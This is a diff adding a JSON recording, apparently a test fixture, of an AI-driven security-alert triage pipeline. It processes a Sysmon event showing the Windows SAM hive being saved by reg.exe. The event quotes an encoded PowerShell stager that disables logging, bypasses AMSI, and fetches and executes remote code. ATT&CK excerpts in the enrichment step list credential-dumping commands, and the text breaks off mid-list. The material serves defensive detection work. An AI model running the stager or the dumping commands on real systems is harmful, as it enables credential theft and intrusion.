@@ -1,0 +1,381 @@
+{
+ "meta": {
+  "name": "2-already-covered",
+  "alert": {
+   "alert_id": "day3-045",
+   "detection_name": "Atomic capture — manual review",
+   "severity": "medium",
+   "events": [
+    {
+     "event_id": "sysmon-3400681",
+     "timestamp": "2020-09-22T08:28:40.319000Z",
+     "source": "windows_sysmon",
+     "host": "WORKSTATION5.theshire.local",
+     "user": "THESHIRE\\pgustavo",
+     "process": {
+      "pid": null,
+      "image": "C:\\Windows\\System32\\reg.exe",
+      "command_line": "\"C:\\windows\\system32\\reg.exe\" save HKLM\\sam sam",
+      "parent": {
+       "pid": null,
+       "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+       "command_line": "\"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==",
+       "parent": null
+      }
+     },
+     "network": null,
+     "registry": null,
+     "raw": {
+      "SeverityValue": 2,
+      "EventReceivedTime": "2020-09-22 04:28:41",
+      "EventID": 1,
+      "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+      "ExecutionProcessID": 3172,
+      "Channel": "Microsoft-Windows-Sysmon/Operational",
+      "host": "wec.internal.cloudapp.net",
+      "AccountType": "User",
+      "ProcessGuid": "{b34bc01c-b5b8-5f69-cc02-000000000900}",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "LogonGuid": "{b34bc01c-22a7-5f69-dfa7-100000000000}",
+      "Opcode": "Info",
+      "EventTime": "2020-09-22 04:28:40",
+      "SourceModuleType": "im_msvistalog",
+      "AccountName": "SYSTEM",
+      "CommandLine": "\"C:\\windows\\system32\\reg.exe\" save HKLM\\sam sam",
+      "Domain": "NT AUTHORITY",
+      "@version": "1",
+      "OpcodeValue": 0,
+      "Severity": "INFO",
+      "User": "THESHIRE\\pgustavo",
+      "Hashes": "SHA1=EB3B03616EEE42F16D0703F64DE23E7E34FE8524,MD5=601BDDF7691C5AF626A5719F1D7E35F1,SHA256=4ED2A27860FA154415F65452FF1F94BD6AF762982E2F3470030C504DC3C8A354,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC",
+      "SourceName": "Microsoft-Windows-Sysmon",
+      "CurrentDirectory": "C:\\windows\\system32\\",
+      "Description": "Registry Console Tool",
+      "Category": "Process Create (rule: ProcessCreate)",
+      "Company": "Microsoft Corporation",
+      "Keywords": -9223372036854775808,
+      "FileVersion": "10.0.18362.476 (WinBuild.160101.0800)",
+      "IntegrityLevel": "High",
+      "UserID": "S-1-5-18",
+      "TerminalSessionId": "2",
+      "ThreadID": 4048,
+      "EventType": "INFO",
+      "ParentProcessGuid": "{b34bc01c-a92a-5f69-7e02-000000000900}",
+      "@timestamp": "2020-09-22T08:28:41.547Z",
+      "port": 64545,
+      "ParentCommandLine": "\"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==",
+      "RecordNumber": 3400681,
+      "Task": 1,
+      "ParentProcessId": "5972",
+      "SourceModuleName": "eventlog",
+      "LogonId": "0x10a7df",
+      "Version": 5,
+      "Product": "Microsoft® Windows® Operating System",
+      "Image": "C:\\Windows\\System32\\reg.exe",
+      "OriginalFileName": "reg.exe",
+      "UtcTime": "2020-09-22 08:28:40.319",
+      "Hostname": "WORKSTATION5.theshire.local",
+      "RuleName": "-",
+      "tags": [
+       "mordorDataset"
+      ]
+     },
+     "untrusted_fields": [
+      "process.command_line",
+      "process.image",
+      "process.parent.command_line"
+     ]
+    }
+   ]
+  },
+  "models": "openrouter:nvidia/nemotron-3.5-super-vl:free -> openrouter:nvidia/nemotron-3-ultra-550b-a55b:free",
+  "recorded_at": "2026-11-24T22:36:05+00:00",
+  "path": [
+   "ingest",
+   "enrich",
+   "triage",
+   "route",
+   "output"
+  ],
+  "outcome": "covered"
+ },
+ "events": [
+  {
+   "node": "ingest",
+   "start": 0.0,
+   "end": 0.001,
+   "update": null
+  },
+  {
+   "node": "enrich",
+   "start": 0.001,
+   "end": 0.166,
+   "update": {
+    "techniques": [
+     {
+      "id": "T1552.002",
+      "kind": "technique",
+      "title": "Credentials in Registry",
+      "text": "T1552.002 Credentials in Registry\nTactics: credential-access\nPlatforms: Windows\nDescription: Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: \n\n* Local Machine Hive: reg query HKLM /f password /t REG_SZ /s\n* Current User Hive: reg query HKCU /f password /t REG_SZ /s\nData sources: WinEventLog:Sysmon, EDR:hunting\nDetection guidance:\n- Defenders observe command-line executions or API-based registry reads targeting sensitive paths like HKLM or HKCU with keyword filters such as 'password', 'cred', or 'logon'. Typically performed by Reg.exe, PowerShell, custom binaries, or offensive tools such as Cobalt Strike. Correlation with process ancestry and command-line arguments indicates suspicious credential discovery activity.",
+      "platforms": [
+       "windows"
+      ],
+      "logsource": null,
+      "technique_ids": [
+       "T1552.002"
+      ],
+      "score": 0.030834914611005692,
+      "matched_by": [
+       "vector",
+       "bm25"
+      ]
+     },
+     {
+      "id": "T1003.002",
+      "kind": "technique",
+      "title": "Security Account Manager",
+      "text": "T1003.002 Security Account Manager\nTactics: credential-access\nPlatforms: Windows\nDescription: Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the net user command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* gsecdump\n* Mimikatz\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* reg save HKLM\\sam sam\n* reg save HKLM\\system system\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\nData sources: WinEventLog:Security, WinEventLog:Sysmon\nDetection guidance:\n- An adversary running with SYSTEM-level privileges executes commands or accesses registry keys to dump the SAM hive or directly reads sensitive local files from the config directory. This behavior often involves sequential access to HKLM\\SAM, HKLM\\SYSTEM, and creation of .save or .dmp files, enabling offline hash extraction.",
+      "platforms": [
+       "windows"
+      ],
+      "logsource": null,
+      "technique_ids": [
+       "T1003.002"
+      ],
+      "score": 0.030679156908665108,
+      "matched_by": [
+       "vector",
+       "bm25"
+      ]
+     },
+     {
+      "id": "T1218.014",
+      "kind": "technique",
+      "title": "MMC",
+      "text": "T1218.014 MMC\nTactics: stealth\nPlatforms: Windows\nDescription: Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt. MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.\n\nFor example, mmc C:\\Users\\foo\\admintools.msc /a will open a custom, saved console msc file in author mode. Another common example is mmc gpedit.msc, which will open the Group Policy Editor application window. \n\nAdversaries may use MMC commands to perform malicious tasks. For example, mmc wbadmin.msc delete catalog -quiet deletes the backup catalog on the system (i.e. Inhibit System Recovery) without prompts to the user (Note: wbadmin.msc may only be present by default on Windows Server operating systems).\n\nAdversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a Component Object Model class object. Then, adversaries may create custom consoles with the “Link to Web Address” snap-in that is linked to the malicious CLSID subkey. Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: mmc.exe -Embedding C:\\path\\to\\test.msc.\nData sources: WinEventLog:Sysmon, WinEventLog:Microsoft-Windows-COM/Operational, WinEventLog:PowerShell\nDetection guidance:\n- Abuse of mmc.exe to execute non-Microsoft or user-staged .msc files and malicious COM CLSIDs. Behavioral chain: (1) suspicious mmc.exe invocation with /a or -Embedding and non-standard .msc path → (2) COM activation of non-baseline CLSIDs by mmc.exe → (3) mmc.exe loads non-baseline DLLs (user-writable/UNC/unsigned) → (4) optional network/DNS activity from mmc.exe.",
+      "platforms": [
+       "windows"
+      ],
+      "logsource": null,
+      "technique_ids": [
+       "T1218.014"
+      ],
+      "score": 0.030536130536130537,
+      "matched_by": [
+       "vector",
+       "bm25"
+      ]
+     },
+     {
+      "id": "T1546.002",
+      "kind": "technique",
+      "title": "Screensaver",
+      "text": "T1546.002 Screensaver\nTactics: privilege-escalation, persistence\nPlatforms: Windows\nDescription: Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. The Windows screensaver application scrnsave.scr is located in C:\\Windows\\System32\\, and C:\\Windows\\sysWOW64\\  on 64-bit Windows systems, along with screensavers included with base Windows installations.\n\nThe following screensaver settings are stored in the Registry (HKCU\\Control Panel\\Desktop\\) and could be manipulated to achieve persistence:\n\n* SCRNSAVE.exe - set to malicious PE path\n* ScreenSaveActive - set to '1' to enable the screensaver\n* ScreenSaverIsSecure - set to '0' to not require a password to unlock\n* ScreenSaveTimeout - sets user inactivity timeout before screensaver is executed\n\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.\nData sources: WinEventLog:Security, WinEventLog:Sysmon\nDetection guidance:\n- Unusual screensaver (.scr) executions correlated with recent registry modifications to HKCU\\Control Panel\\Desktop values such as SCRNSAVE.exe, ScreenSaveTimeout, and ScreenSaveActive. Detection focuses on PE image paths not consistent with known legitimate screensavers and triggered after user inactivity timeout.",
+      "platforms": [
+       "windows"
+      ],
+      "logsource": null,
+      "technique_ids": [
+       "T1546.002"
+      ],
+      "score": 0.029437229437229435,
+      "matched_by": [
+       "vector",
+       "bm25"
+      ]
+     },
+     {
+      "id": "T1059.001",
+      "kind": "technique",
+      "title": "PowerShell",
+      "text": "T1059.001 PowerShell\nTactics: execution\nPlatforms: Windows\nDescription: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).\nData sources: WinEventLog:Sysmon, WinEventLog:PowerShell\nDetection guidance:\n- Detects behavioral chains where PowerShell is launched with encoded commands, unusual parent processes, or suspicious modules loaded, potentially followed by network connections or child process spawning. Supports detection of both direct (powershell.exe) and indirect (.NET automation) invocations.",
+      "platforms": [
+       "windows"
